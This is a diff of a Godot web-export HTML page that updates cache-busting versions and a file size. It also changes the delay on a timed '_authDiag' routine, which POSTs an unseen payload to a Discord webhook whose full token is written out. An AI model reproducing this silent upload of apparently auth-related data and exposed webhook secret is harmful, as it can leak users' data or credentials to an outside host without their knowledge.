@@ -839,7 +839,7 @@ body {
 		<script>
 		// Cache busting: 攔截 fetch，為 .pck/.wasm 加版本參數
 		(function() {
-			var V = "3f37b3c-1774510047";
+			var V = "b8fefa8-1774510498";
 			var _f = window.fetch;
 			window.fetch = function(u) {
 				if (typeof u === "string" && /\.(pck|wasm|js)(\?|$)/.test(u))
@@ -848,9 +848,9 @@ body {
 			};
 		})();
 		</script>
-		<script src="index.js?v=3f37b3c-1774510047"></script>
+		<script src="index.js?v=b8fefa8-1774510498"></script>
 		<script>
-		const GODOT_CONFIG = {"args":[],"canvasResizePolicy":2,"emscriptenPoolSize":8,"ensureCrossOriginIsolationHeaders":true,"executable":"index","experimentalVK":false,"fileSizes":{"index.pck":38156424,"index.wasm":37685705},"focusCanvas":true,"gdextensionLibs":[],"godotPoolSize":4};
+		const GODOT_CONFIG = {"args":[],"canvasResizePolicy":2,"emscriptenPoolSize":8,"ensureCrossOriginIsolationHeaders":true,"executable":"index","experimentalVK":false,"fileSizes":{"index.pck":38157304,"index.wasm":37685705},"focusCanvas":true,"gdextensionLibs":[],"godotPoolSize":4};
 		const GODOT_THREADS_ENABLED = false;
 		const engine = new Engine(GODOT_CONFIG);
 
@@ -877,7 +877,7 @@ body {
 				fetch('https://discord.com/api/webhooks/1486211591136481420/GUULz5yDLGaPovmZnYpkgiCjuqlC4-2eUSlvWXNW5aE2WdTg-dZwtQAvr6mqbD56Hcb6', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: payload}).catch(function(e) { console.error('Diag send failed:', e); });
 			}
 		};
-		setTimeout(function() { window._authDiag.send(); }, 15000);
+		setTimeout(function() { window._authDiag.send(); }, 30000);
 
 		(function () {
 			const statusOverlay = document.getElementById('status');
